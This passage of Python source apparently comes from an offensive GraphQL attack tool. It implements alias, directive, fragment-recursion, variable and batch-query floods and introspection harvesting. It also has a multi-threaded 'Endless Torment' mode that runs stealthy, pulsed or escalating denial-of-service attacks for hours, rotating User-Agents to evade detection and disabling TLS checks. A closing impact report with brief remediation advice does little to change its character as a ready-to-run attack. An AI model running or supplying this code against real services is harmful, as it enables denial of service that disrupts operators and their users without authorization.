                print(f"    TIMEOUT with alias overload!")
                self.attack_results.append(f"Timeout with {count} aliases")
                return count
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        print("    No alias overload limit detected up to 5000 aliases!")
        self.attack_results.append("No alias overload limit up to 5000 aliases")

    def attack_directive_flood(self, endpoint):
        """Directive flood attack"""
        print("\nTesting Directive Flood Vulnerability...")
        
        directive_counts = [10, 50, 100, 200, 500, 1000]
        
        for count in directive_counts:
            print(f"  Testing directive flood ({count} directives)...")
            
            query = "query { "
            query += "__typename"
            for i in range(count):
                query += f" @include(if: true)"
            query += " }"
            
            payload = {"query": query}
            
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                start = time.time()
                response = self.session.post(endpoint, json=payload, timeout=30, headers=headers, verify=False)
                elapsed = time.time() - start
                
                if response.status_code == 200:
                    data = response.json()
                    print(f"    {count} directives accepted ({elapsed:.2f}s)")
                    if elapsed > 5.0:
                        print(f"    Directive processing slowdown!")
                        self.attack_results.append(f"Directive flood: {elapsed:.2f}s for {count} directives")
                    else:
                        self.attack_results.append(f"Accepts {count} directives: {elapsed:.2f}s")
                elif response.status_code == 400:
                    print(f"    Rejected with HTTP 400 (Bad Request)")
                    self.attack_results.append(f"Directive flood blocked at {count}")
                    return count
                else:
                    print(f"    HTTP {response.status_code}")
                    
            except requests.exceptions.Timeout:
                print(f"    TIMEOUT with directive flood!")
                self.attack_results.append(f"Timeout with {count} directives")
                return count
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        print("    No directive flood limit detected up to 1000 directives!")
        self.attack_results.append("No directive flood limit up to 1000 directives")

    def attack_fragment_recursion(self, endpoint):
        """Fragment recursion attack"""
        print("\nTesting Fragment Recursion Vulnerability...")
        
        # Test 1: Simple recursion
        recursive_query = """
        query RecursiveAttack {
          ...FragmentA
        }
        fragment FragmentA on Query {
          __typename
          ...FragmentB
        }
        fragment FragmentB on Query {
          __typename
          ...FragmentC
        }
        fragment FragmentC on Query {
          __typename
          ...FragmentA
        }
        """
        
        # Test 2: Deep recursion
        deep_recursive = """
        query DeepRecursive {
          ...Level1
        }
        fragment Level1 on Query {
          __typename
          ...Level2
        }
        fragment Level2 on Query {
          __typename
          ...Level3
        }
        fragment Level3 on Query {
          __typename
          ...Level4
        }
        fragment Level4 on Query {
          __typename
          ...Level5
        }
        fragment Level5 on Query {
          __typename
          ...Level1
        }
        """
        
        tests = [
            ("Simple recursion", recursive_query),
            ("Deep recursion", deep_recursive)
        ]
        
        for test_name, query in tests:
            print(f"  Testing {test_name}...")
            
            payload = {"query": query}
            
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                start = time.time()
                response = self.session.post(endpoint, json=payload, timeout=20, headers=headers, verify=False)
                elapsed = time.time() - start
                
                if response.status_code == 200:
                    data = response.json()
                    if 'errors' in data:
                        for error in data['errors']:
                            error_msg = str(error).lower()
                            if 'circular' in error_msg or 'recursion' in error_msg or 'infinite' in error_msg:
                                print(f"    Fragment recursion detected and blocked: {str(error)[:80]}")
                                self.attack_results.append(f"Fragment recursion blocked: {test_name}")
                                break
                        else:
                            print(f"    Fragment recursion accepted ({elapsed:.2f}s)")
                            if elapsed > 3.0:
                                print(f"    Slow processing of recursive fragments")
                                self.attack_results.append(f"Slow recursive fragment: {elapsed:.2f}s")
                            else:
                                self.attack_results.append(f"Accepts recursive fragments: {test_name}")
                    else:
                        print(f"    Fragment recursion accepted ({elapsed:.2f}s)")
                        self.attack_results.append(f"Accepts recursive fragments: {test_name}")
                else:
                    print(f"    HTTP {response.status_code}")
                    
            except requests.exceptions.Timeout:
                print(f"    TIMEOUT with fragment recursion!")
                self.attack_results.append(f"Timeout with fragment recursion: {test_name}")
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")

    def attack_union_interface_abuse(self, endpoint):
        """Union and interface type abuse"""
        print("\nTesting Union/Interface Abuse...")
        
        union_query = """
        query UnionInterfaceAttack {
          __typename
          __schema {
            types {
              name
              ... on __UnionType {
                possibleTypes {
                  name
                  fields {
                    name
                    type {
                      name
                    }
                  }
                }
              }
              ... on __InterfaceType {
                possibleTypes {
                  name
                  fields {
                    name
                    type {
                      name
                    }
                  }
                }
              }
            }
          }
        }
        """
        
        payload = {"query": union_query}
        
        print("  Testing union/interface type resolution...")
        
        try:
            headers = {'User-Agent': random.choice(self.user_agents)}
            start = time.time()
            response = self.session.post(endpoint, json=payload, timeout=30, headers=headers, verify=False)
            elapsed = time.time() - start
            
            if response.status_code == 200:
                print(f"    Union/interface query accepted ({elapsed:.2f}s)")
                if elapsed > 10.0:
                    print(f"    Heavy type resolution load!")
                    self.attack_results.append(f"Heavy union/interface resolution: {elapsed:.2f}s")
                else:
                    self.attack_results.append(f"Union/interface query: {elapsed:.2f}s")
            elif response.status_code == 400:
                print(f"    Union/interface query rejected")
                self.attack_results.append("Union/interface query blocked")
            else:
                print(f"    HTTP {response.status_code}")
                
        except requests.exceptions.Timeout:
            print(f"    TIMEOUT with union/interface query!")
            self.attack_results.append("Timeout with union/interface query")
        except Exception as e:
            print(f"    Error: {str(e)[:50]}")

    def attack_variable_bomb(self, endpoint):
        """Variable bomb attack"""
        print("\nTesting Variable Bomb Vulnerability...")
        
        variable_counts = [10, 20, 30, 50, 100]
        
        for count in variable_counts:
            print(f"  Testing {count} large variables...")
            
            # Build variable list
            var_decls = []
            var_names = []
            for i in range(count):
                var_decls.append(f"$v{i}: String")
                var_names.append(f"v{i}")
            
            var_decls_str = ", ".join(var_decls)
            var_names_str = ", ".join(var_names)
            
            variable_query = f"""
            query VariableBomb({var_decls_str}) {{
              __typename
            }}
            """
            
            variables = {}
            for i in range(count):
                variables[f"v{i}"] = "x" * 1000  # 1KB per variable
            
            payload = {
                "query": variable_query,
                "variables": variables
            }
            
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                start = time.time()
                response = self.session.post(endpoint, json=payload, timeout=30, headers=headers, verify=False)
                elapsed = time.time() - start
                
                if response.status_code == 200:
                    print(f"    {count} variables accepted ({elapsed:.2f}s)")
                    if elapsed > 5.0:
                        print(f"    Variable processing slowdown!")
                        self.attack_results.append(f"Variable bomb: {elapsed:.2f}s for {count} vars")
                    else:
                        self.attack_results.append(f"Accepts {count} variables: {elapsed:.2f}s")
                elif response.status_code == 400 or response.status_code == 413:
                    print(f"    Variable bomb blocked: HTTP {response.status_code}")
                    self.attack_results.append(f"Variable bomb blocked at {count}: HTTP {response.status_code}")
                    return count
                else:
                    print(f"    HTTP {response.status_code}")
                    
            except requests.exceptions.Timeout:
                print(f"    TIMEOUT with variable bomb!")
                self.attack_results.append(f"Timeout with {count} variables")
                return count
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        print("    No variable bomb limit detected up to 100 variables!")
        self.attack_results.append("No variable bomb limit up to 100 variables")

    def attack_introspection_exploitation(self, endpoint):
        """Introspection query exploitation"""
        print("\nTesting Introspection Exploitation...")
        
        # Full introspection query
        introspection_query = self.generate_introspection_query()
        
        payload = {"query": introspection_query}
        
        print("  Testing full introspection query...")
        
        try:
            headers = {'User-Agent': random.choice(self.user_agents)}
            start = time.time()
            response = self.session.post(endpoint, json=payload, timeout=60, headers=headers, verify=False)
            elapsed = time.time() - start
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and data['data'].get('__schema'):
                    schema_size = len(json.dumps(data['data']))
                    print(f"    Introspection enabled ({elapsed:.2f}s, {schema_size} bytes)")
                    
                    if elapsed > 10.0:
                        print(f"    Heavy introspection load!")
                        self.attack_results.append(f"Heavy introspection: {elapsed:.2f}s, {schema_size} bytes")
                    else:
                        self.attack_results.append(f"Introspection enabled: {elapsed:.2f}s")
                    
                    # Try to extract useful info
                    try:
                        types = data['data']['__schema']['types']
                        print(f"    Found {len(types)} types")
                        
                        # Look for interesting types
                        interesting = ['Query', 'Mutation', 'Subscription', 'User', 'Post', 'Order', 'Product']
                        found = [t for t in types if t.get('name') in interesting]
                        if found:
                            print(f"    Found interesting types: {[t['name'] for t in found]}")
                    except:
                        pass
                else:
                    print(f"    Introspection disabled or restricted")
                    self.attack_results.append("Introspection restricted")
            else:
                print(f"    HTTP {response.status_code}")
                
        except requests.exceptions.Timeout:
            print(f"    TIMEOUT with introspection!")
            self.attack_results.append("Timeout with introspection")
        except Exception as e:
            print(f"    Error: {str(e)[:50]}")

    def generate_introspection_query(self):
        """Generate full introspection query"""
        return """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              ...FullType
            }
            directives {
              name
              description
              locations
              args {
                ...InputValue
              }
            }
          }
        }
        fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args {
              ...InputValue
            }
            type {
              ...TypeRef
            }
            isDeprecated
            deprecationReason
          }
          inputFields {
            ...InputValue
          }
          interfaces {
            ...TypeRef
          }
          enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
          }
          possibleTypes {
            ...TypeRef
          }
        }
        fragment InputValue on __InputValue {
          name
          description
          type { ...TypeRef }
          defaultValue
        }
        fragment TypeRef on __Type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """

    def attack_batch_queries(self, endpoint):
        """Batch query attack"""
        print("\nTesting Batch Query Vulnerability...")
        
        batch_sizes = [2, 5, 10, 20, 50, 100]
        
        for size in batch_sizes:
            print(f"  Testing batch of {size} queries...")
            
            batch = []
            for i in range(size):
                batch.append({
                    "query": f"query BatchQuery{i} {{ __typename " + 
                            " ".join([f"field{j}: __typename" for j in range(10)]) + 
                            " }"
                })
            
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                start = time.time()
                response = self.session.post(endpoint, json=batch, timeout=30, headers=headers, verify=False)
                elapsed = time.time() - start
                
                if response.status_code == 200:
                    data = response.json()
                    if isinstance(data, list):
                        print(f"    {size} batch queries accepted ({elapsed:.2f}s)")
                        if elapsed > 10.0:
                            print(f"    Batch processing slowdown!")
                            self.attack_results.append(f"Batch query: {elapsed:.2f}s for {size} queries")
                        else:
                            self.attack_results.append(f"Accepts {size} batch queries: {elapsed:.2f}s")
                    else:
                        print(f"    Batch not supported (single response)")
                        self.attack_results.append("Batch queries not supported")
                        return
                elif response.status_code == 400 or response.status_code == 413:
                    print(f"    Batch queries blocked: HTTP {response.status_code}")
                    self.attack_results.append(f"Batch queries blocked at {size}: HTTP {response.status_code}")
                    return size
                else:
                    print(f"    HTTP {response.status_code}")
                    
            except requests.exceptions.Timeout:
                print(f"    TIMEOUT with batch queries!")
                self.attack_results.append(f"Timeout with {size} batch queries")
                return size
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        print("    No batch query limit detected up to 100 queries!")
        self.attack_results.append("No batch query limit up to 100 queries")

    def attack_persisted_queries(self, endpoint):
        """Persisted query attack"""
        print("\nTesting Persisted Query Vulnerability...")
        
        # Try different persisted query formats
        formats = [
            # Apollo style
            {
                "extensions": {
                    "persistedQuery": {
                        "version": 1,
                        "sha256Hash": "ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38"
                    }
                }
            },
            # Relay style
            {
                "id": "ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38"
            },
            # With query fallback
            {
                "query": "{__typename}",
                "extensions": {
                    "persistedQuery": {
                        "version": 1,
                        "sha256Hash": "ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38"
                    }
                }
            },
        ]
        
        for i, format in enumerate(formats, 1):
            print(f"  Testing format {i}...")
            
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                start = time.time()
                response = self.session.post(endpoint, json=format, timeout=10, headers=headers, verify=False)
                elapsed = time.time() - start
                
                print(f"    HTTP {response.status_code} ({elapsed:.2f}s)")
                
                if response.status_code == 200:
                    data = response.json()
                    if 'errors' in data:
                        for error in data['errors']:
                            if 'persisted' in str(error).lower() or 'hash' in str(error).lower():
                                print(f"    Persisted query error: {str(error)[:80]}")
                                self.attack_results.append("Persisted queries enabled")
                                return
                    else:
                        print(f"    Persisted query accepted")
                        self.attack_results.append("Persisted queries enabled")
                        return
                elif response.status_code == 400:
                    # Check error message
                    try:
                        data = response.json()
                        if 'errors' in data:
                            for error in data['errors']:
                                if 'persisted' in str(error).lower():
                                    print(f"    Persisted queries enabled but hash not found")
                                    self.attack_results.append("Persisted queries enabled")
                                    return
                    except:
                        pass
                    
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        print("    Persisted queries not detected")
        self.attack_results.append("Persisted queries not detected")

    def execute_all_precision_attacks(self, endpoint):
        """Execute all precision attacks"""
        print("\nEXECUTING ALL PRECISION ATTACKS")
        print("=" * 80)
        
        attacks = [
            ("Depth Limitation", self.attack_depth_limitation),
            ("Field Duplication", self.attack_field_duplication),
            ("Alias Overload", self.attack_alias_overload),
            ("Directive Flood", self.attack_directive_flood),
            ("Fragment Recursion", self.attack_fragment_recursion),
            ("Union/Interface Abuse", self.attack_union_interface_abuse),
            ("Variable Bomb", self.attack_variable_bomb),
            ("Introspection Exploitation", self.attack_introspection_exploitation),
            ("Batch Queries", self.attack_batch_queries),
            ("Persisted Queries", self.attack_persisted_queries),
        ]
        
        for attack_name, attack_func in attacks:
            print(f"\n{attack_name}")
            print("-" * 40)
            try:
                attack_func(endpoint)
            except Exception as e:
                print(f"    Error in {attack_name}: {str(e)[:50]}")
            
            time.sleep(2)

    def endless_torment(self):
        """Sustained long-term attack"""
        print("\n" + "=" * 80)
        print("ENDLESS TORMENT - SUSTAINED ATTACK")
        print("=" * 80)
        
        # Find working endpoint
        if not self.working_endpoints:
            print("Finding working endpoint...")
            self.advanced_reconnaissance_phase()
            if not self.working_endpoints:
                print("No endpoints found. Aborting.")
                return
        
        endpoint = self.working_endpoints[0]['endpoint']
        print(f"Target: {endpoint}")
        
        print("\nSUSTAINED ATTACK MODES:")
        print("1. Low & Slow (stealthy, long duration)")
        print("2. Pulsed Attack (bursts with pauses)")
        print("3. Randomized Attack (unpredictable pattern)")
        print("4. Escalating Attack (gradually increasing intensity)")
        print("5. Full Spectrum (all techniques)")
        
        mode = input("\nSelect mode (1-5): ").strip()
        
        duration = int(input("\nAttack duration in minutes (1-480) [60]: ").strip() or "60")
        intensity = int(input("Attack intensity (1-1000) [100]: ").strip() or "100")
        
        print(f"\nLaunching Endless Torment for {duration} minutes...")
        
        self.stop_signal = False
        
        # Start monitoring
        monitor_thread = threading.Thread(target=self.endless_torment_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Launch attack based on mode
        if mode == "1":
            self.low_and_slow_attack(endpoint, duration * 60, intensity)
        elif mode == "2":
            self.pulsed_attack(endpoint, duration * 60, intensity)
        elif mode == "3":
            self.randomized_attack(endpoint, duration * 60, intensity)
        elif mode == "4":
            self.escalating_attack(endpoint, duration * 60, intensity)
        elif mode == "5":
            self.full_spectrum_attack(endpoint, duration * 60, intensity)
        else:
            print("Invalid mode!")
            return
        
        self.stop_signal = True
        time.sleep(5)
        
        print("\n\nEndless Torment completed.")
        self.generate_assault_report()

    def endless_torment_monitor(self):
        """Monitor for endless torment attack"""
        start_time = time.time()
        attack_cycles = 0
        
        while not self.stop_signal:
            elapsed = time.time() - start_time
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            seconds = int(elapsed % 60)
            
            stats = f"Time: {hours:02d}:{minutes:02d}:{seconds:02d} | "
            stats += f"Active: {self.active_attacks:3d} | "
            stats += f"Success: {self.success_count:6d} | "
            stats += f"Fails: {self.fail_count:6d} | "
            stats += f"Cycles: {attack_cycles}"
            
            print(f"\r{stats}", end="", flush=True)
            
            attack_cycles += 1
            time.sleep(1)

    def low_and_slow_attack(self, endpoint, duration_seconds, intensity):
        """Low and slow stealth attack"""
        print("\nLow & Slow Attack - Stealth Mode")
        
        payloads = self.generate_aggressive_payloads(20)
        
        def low_slow_worker():
            while not self.stop_signal and time.time() - start_time < duration_seconds:
                self.active_attacks += 1
                try:
                    payload = random.choice(payloads[:5])
                    delay = random.uniform(1.0, 10.0)  # Slow delays
                    time.sleep(delay)
                    
                    headers = {'User-Agent': random.choice(self.user_agents)}
                    response = self.session.post(endpoint, json=payload, timeout=30, headers=headers, verify=False)
                    
                    if response.status_code == 200:
                        self.success_count += 1
                    elif response.status_code == 429:
                        self.rate_limit_count += 1
                        time.sleep(30)  # Longer sleep on rate limit
                    
                except Exception as e:
                    self.fail_count += 1
                finally:
                    self.active_attacks -= 1
        
        start_time = time.time()
        
        threads = []
        for i in range(min(intensity, 50)):
            t = threading.Thread(target=low_slow_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        while time.time() - start_time < duration_seconds and not self.stop_signal:
            time.sleep(1)
        
        self.stop_signal = True
        for t in threads:
            t.join(timeout=5)

    def pulsed_attack(self, endpoint, duration_seconds, intensity):
        """Pulsed attack with bursts"""
        print("\nPulsed Attack - Burst Mode")
        
        payloads = self.generate_aggressive_payloads(50)
        
        def pulse_worker(pulse_duration, sleep_duration):
            while not self.stop_signal and time.time() - start_time < duration_seconds:
                pulse_end = time.time() + pulse_duration
                while time.time() < pulse_end and not self.stop_signal:
                    self.active_attacks += 1
                    try:
                        payload = random.choice(payloads)
                        headers = {'User-Agent': random.choice(self.user_agents)}
                        response = self.session.post(endpoint, json=payload, timeout=10, headers=headers, verify=False)
                        
                        if response.status_code == 200:
                            self.success_count += 1
                        elif response.status_code == 429:
                            self.rate_limit_count += 1
                        
                    except Exception as e:
                        self.fail_count += 1
                    finally:
                        self.active_attacks -= 1
                    
                    time.sleep(random.uniform(0.001, 0.01))  # Fast during pulse
                
                if not self.stop_signal:
                    # Sleep between pulses
                    sleep_start = time.time()
                    while time.time() - sleep_start < sleep_duration and not self.stop_signal:
                        time.sleep(1)
        
        start_time = time.time()
        
        threads = []
        pulse_duration = random.uniform(10, 60)
        sleep_duration = random.uniform(30, 120)
        
        for i in range(min(intensity, 200)):
            t = threading.Thread(target=pulse_worker, args=(pulse_duration, sleep_duration))
            t.daemon = True
            t.start()
            threads.append(t)
        
        while time.time() - start_time < duration_seconds and not self.stop_signal:
            time.sleep(1)
        
        self.stop_signal = True
        for t in threads:
            t.join(timeout=5)

    def randomized_attack(self, endpoint, duration_seconds, intensity):
        """Completely randomized attack"""
        print("\nRandomized Attack - Unpredictable Mode")
        
        attack_patterns = [
            self.lightning_worker,
            self.complexity_attack,
            self.memory_attack,
            self.mixed_attack,
            self.batch_attack_worker,
        ]
        
        start_time = time.time()
        pattern_end = time.time() + random.uniform(30, 300)
        
        while time.time() - start_time < duration_seconds and not self.stop_signal:
            if time.time() > pattern_end:
                current_pattern = random.choice(attack_patterns)
                pattern_end = time.time() + random.uniform(30, 300)
                print(f"\nSwitching attack pattern to {current_pattern.__name__}...")
            
            workers = random.randint(1, min(intensity, 100))
            threads = []
            
            for i in range(workers):
                if current_pattern == self.lightning_worker:
                    payloads = self.generate_aggressive_payloads(10)
                    t = threading.Thread(target=current_pattern, args=(endpoint, 'POST', 'application/json', payloads))
                else:
                    t = threading.Thread(target=current_pattern, args=(endpoint,))
                
                t.daemon = True
                t.start()
                threads.append(t)
            
            pattern_run_time = random.uniform(10, 120)
            time.sleep(pattern_run_time)
        
        self.stop_signal = True

    def escalating_attack(self, endpoint, duration_seconds, max_intensity):
        """Gradually escalating attack"""
        print("\nEscalating Attack - Gradual Intensity")
        
        payloads = self.generate_aggressive_payloads(50)
        start_time = time.time()
        
        current_intensity = 1
        escalation_interval = duration_seconds / 20
        
        while time.time() - start_time < duration_seconds and not self.stop_signal:
            elapsed_ratio = (time.time() - start_time) / duration_seconds
            current_intensity = int(max_intensity * elapsed_ratio)
            current_intensity = max(1, min(current_intensity, max_intensity))
            
            print(f"\rIntensity: {current_intensity}/{max_intensity} | Active: {self.active_attacks}", end="", flush=True)
            
            threads = []
            for i in range(current_intensity):
                t = threading.Thread(target=self.lightning_worker, args=(endpoint, 'POST', 'application/json', payloads))
                t.daemon = True
                t.start()
                threads.append(t)
            
            time.sleep(escalation_interval)
        
        self.stop_signal = True

    def full_spectrum_attack(self, endpoint, duration_seconds, intensity):
        """Full spectrum attack"""
        print("\nFull Spectrum Attack - All Techniques")
        
        start_time = time.time()
        
        # Start multiple attack types
        attack_types = [
            (self.low_and_slow_attack, 0.2),
            (self.pulsed_attack, 0.3),
            (self.randomized_attack, 0.25),
            (self.escalating_attack, 0.25),
        ]
        
        threads = []
        for attack_func, intensity_factor in attack_types:
            attack_intensity = max(1, int(intensity * intensity_factor))
            t = threading.Thread(target=attack_func, args=(endpoint, duration_seconds, attack_intensity))
            t.daemon = True
            t.start()
            threads.append(t)
        
        while time.time() - start_time < duration_seconds and not self.stop_signal:
            time.sleep(1)
        
        self.stop_signal = True

    def impact_assessment(self):
        """Measure before/after impact"""
        print("\n" + "=" * 80)
        print("IMPACT ASSESSMENT - MEASURE BEFORE/AFTER")
        print("=" * 80)
        
        # Find working endpoint
        if not self.working_endpoints:
            print("Finding working endpoint...")
            self.advanced_reconnaissance_phase()
            if not self.working_endpoints:
                print("No endpoints found. Aborting.")
                return
        
        endpoint = self.working_endpoints[0]['endpoint']
        print(f"Target: {endpoint}")
        
        print("\nASSESSMENT MODES:")
        print("1. Complete Impact Analysis (Full test)")
        print("2. Quick Performance Test")
        print("3. Load Tolerance Test")
        print("4. Recovery Time Test")
        print("5. Stress Test")
        
        mode = input("\nSelect mode (1-5): ").strip()
        
        if mode == "1":
            self.complete_impact_analysis(endpoint)
        elif mode == "2":
            self.quick_performance_test(endpoint)
        elif mode == "3":
            self.load_tolerance_test(endpoint)
        elif mode == "4":
            self.recovery_time_test(endpoint)
        elif mode == "5":
            self.stress_test(endpoint)
        else:
            print("Invalid mode!")
            return

    def complete_impact_analysis(self, endpoint):
        """Complete impact analysis"""
        print("\nCOMPLETE IMPACT ANALYSIS")
        print("=" * 80)
        
        print("\nPhase 1: Baseline Performance Measurement")
        print("-" * 40)
        
        baseline_results = self.measure_performance(endpoint, "baseline", 30)
        
        print("\nPhase 2: Light Load Performance")
        print("-" * 40)
        
        self.stop_signal = False
        light_threads = []
        for i in range(10):
            t = threading.Thread(target=self.light_attack_worker, args=(endpoint,))
            t.daemon = True
            t.start()
            light_threads.append(t)
        
        time.sleep(15)
        
        light_load_results = self.measure_performance(endpoint, "light_load", 30)
        
        self.stop_signal = True
        for t in light_threads:
            t.join(timeout=5)
        
        time.sleep(10)
        
        print("\nPhase 3: Heavy Load Performance")
        print("-" * 40)
        
        self.stop_signal = False
        heavy_threads = []
        for i in range(50):
            t = threading.Thread(target=self.heavy_attack_worker, args=(endpoint,))
            t.daemon = True
            t.start()
            heavy_threads.append(t)
        
        time.sleep(30)
        
        heavy_load_results = self.measure_performance(endpoint, "heavy_load", 30)
        
        self.stop_signal = True
        for t in heavy_threads:
            t.join(timeout=5)
        
        print("\nPhase 4: Recovery Performance")
        print("-" * 40)
        
        time.sleep(30)
        
        recovery_results = self.measure_performance(endpoint, "recovery", 30)
        
        self.generate_impact_report(baseline_results, light_load_results, 
                                  heavy_load_results, recovery_results)

    def measure_performance(self, endpoint, phase_name, num_requests):
        """Measure performance for a phase"""
        print(f"  Measuring {phase_name} performance ({num_requests} requests)...")
        
        results = {
            'response_times': [],
            'success_count': 0,
            'error_count': 0,
            'timeout_count': 0,
            'error_405_count': 0,
            'status_codes': {}
        }
        
        for i in range(num_requests):
            try:
                payload = {"query": "{__typename}"}
                headers = {'User-Agent': random.choice(self.user_agents)}
                
                start = time.time()
                response = self.session.post(endpoint, json=payload, timeout=15, headers=headers, verify=False)
                elapsed = time.time() - start
                
                results['response_times'].append(elapsed)
                results['success_count'] += 1
                
                status = response.status_code
                if status in results['status_codes']:
                    results['status_codes'][status] += 1
                else:
                    results['status_codes'][status] = 1
                
                if status == 405:
                    results['error_405_count'] += 1
                
                if i % 5 == 0:
                    print(f"    Request {i+1}/{num_requests}: {elapsed:.3f}s (HTTP {status})")
                
                time.sleep(0.5)
                
            except requests.exceptions.Timeout:
                results['timeout_count'] += 1
                results['response_times'].append(15.0)
            except Exception as e:
                results['error_count'] += 1
                results['response_times'].append(15.0)
        
        if results['response_times']:
            results['avg_time'] = statistics.mean(results['response_times'])
            results['median_time'] = statistics.median(results['response_times'])
            results['max_time'] = max(results['response_times'])
            results['min_time'] = min(results['response_times'])
            results['success_rate'] = results['success_count'] / num_requests * 100
            results['error_405_rate'] = results['error_405_count'] / num_requests * 100
        
        return results

    def light_attack_worker(self, endpoint):
        """Worker for light attack"""
        payloads = self.generate_aggressive_payloads(10)
        
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                payload = random.choice(payloads)
                headers = {'User-Agent': random.choice(self.user_agents)}
                self.session.post(endpoint, json=payload, timeout=10, headers=headers, verify=False)
                self.success_count += 1
            except:
                self.fail_count += 1
            finally:
                self.active_attacks -= 1
            
            time.sleep(random.uniform(0.1, 1.0))

    def heavy_attack_worker(self, endpoint):
        """Worker for heavy attack"""
        payloads = self.generate_aggressive_payloads(20)
        
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                for i in range(random.randint(1, 5)):
                    payload = random.choice(payloads)
                    headers = {'User-Agent': random.choice(self.user_agents)}
                    self.session.post(endpoint, json=payload, timeout=5, headers=headers, verify=False)
                    self.success_count += 1
            except:
                self.fail_count += 1
            finally:
                self.active_attacks -= 1
            
            time.sleep(random.uniform(0.01, 0.1))

    def generate_impact_report(self, baseline, light_load, heavy_load, recovery):
        """Generate impact assessment report"""
        print("\n" + "=" * 80)
        print("IMPACT ASSESSMENT REPORT")
        print("=" * 80)
        
        print(f"\nTarget: {self.target_url}")
        print(f"Test conducted: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        print(f"\n" + "=" * 80)
        print("PERFORMANCE METRICS")
        print("=" * 80)
        
        phases = [
            ("Baseline", baseline),
            ("Light Load", light_load),
            ("Heavy Load", heavy_load),
            ("Recovery", recovery)
        ]
        
        print(f"\n{'Phase':<15} {'Avg Time':<12} {'Success %':<12} {'405 Errors %':<12} {'Timeouts':<10} {'Errors':<10}")
        print("-" * 80)
        
        for phase_name, results in phases:
            if 'avg_time' in results:
                avg = f"{results['avg_time']:.3f}s"
                success = f"{results.get('success_rate', 0):.1f}%"
                error_405 = f"{results.get('error_405_rate', 0):.1f}%"
                timeouts = results.get('timeout_count', 0)
                errors = results.get('error_count', 0)
                
                print(f"{phase_name:<15} {avg:<12} {success:<12} {error_405:<12} {timeouts:<10} {errors:<10}")
        
        if 'avg_time' in baseline and 'avg_time' in heavy_load:
            performance_degradation = (heavy_load['avg_time'] / baseline['avg_time']) * 100
            
            print(f"\n" + "=" * 80)
            print("IMPACT ANALYSIS")
            print("=" * 80)
            
            print(f"\nPerformance Degradation: {performance_degradation:.1f}% of baseline")
            print(f"Success Rate Change: {heavy_load.get('success_rate', 0) - baseline.get('success_rate', 0):.1f}%")
            print(f"405 Error Rate: {heavy_load.get('error_405_rate', 0):.1f}%")
            print(f"Maximum Response Time: {heavy_load.get('max_time', 0):.3f}s")
            
            if performance_degradation > 1000:
                print(f"\n🚨 CRITICAL IMPACT: Service degradation >1000%")
                print(f"   DoS vulnerability CONFIRMED")
                self.attack_results.append(f"Critical performance degradation: {performance_degradation:.1f}%")
            elif performance_degradation > 500:
                print(f"\n⚠️  SEVERE IMPACT: Service degradation >500%")
                print(f"   Significant DoS vulnerability")
                self.attack_results.append(f"Severe performance degradation: {performance_degradation:.1f}%")
            elif performance_degradation > 200:
                print(f"\n⚠️  MODERATE IMPACT: Service degradation >200%")
                print(f"   Potential DoS vulnerability")
                self.attack_results.append(f"Moderate performance degradation: {performance_degradation:.1f}%")
            elif performance_degradation > 150:
                print(f"\n📊 NOTICEABLE IMPACT: Service degradation >150%")
                self.attack_results.append(f"Noticeable performance degradation: {performance_degradation:.1f}%")
            else:
                print(f"\n✅ MINIMAL IMPACT: Service handles load well")
                self.attack_results.append("Minimal performance impact")
            
            if heavy_load.get('error_405_rate', 0) > 50:
                print(f"\n🚨 405 ERRORS: {heavy_load.get('error_405_rate', 0):.1f}% of requests rejected")
                print(f"   Service is rejecting requests under load")
                self.attack_results.append(f"High 405 error rate: {heavy_load.get('error_405_rate', 0):.1f}%")
            
            if 'avg_time' in recovery:
                recovery_percentage = (recovery['avg_time'] / baseline['avg_time']) * 100
                print(f"\nRecovery Performance: {recovery_percentage:.1f}% of baseline")
                
                if recovery_percentage > 150:
                    print(f"   🚨 Slow recovery after attack")
                    self.attack_results.append(f"Slow recovery: {recovery_percentage:.1f}% of baseline")
                elif recovery_percentage > 120:
                    print(f"   ⚠️  Moderate recovery time")
                    self.attack_results.append(f"Moderate recovery: {recovery_percentage:.1f}% of baseline")
                else:
                    print(f"   ✅ Good recovery")
        
        print(f"\n" + "=" * 80)
        print("RECOMMENDATIONS")
        print("=" * 80)
        
        print(f"\nBased on test results:")
        
        if 'performance_degradation' in locals() and performance_degradation > 1000:
            print("   1. 🚨 IMMEDIATE ACTION REQUIRED")
            print("   2. Implement query complexity limiting")
            print("   3. Add aggressive rate limiting")
            print("   4. Enable query depth limiting")
            print("   5. Implement query whitelisting")
            print("   6. Add circuit breakers")
            print("   7. Monitor query patterns")
            print("   8. Consider GraphQL security gateway")
        elif 'performance_degradation' in locals() and performance_degradation > 500:
            print("   1. ⚠️  URGENT ACTION RECOMMENDED")
            print("   2. Review and implement query limits")
            print("   3. Add rate limiting")
            print("   4. Monitor performance metrics")
            print("   5. Implement query cost analysis")
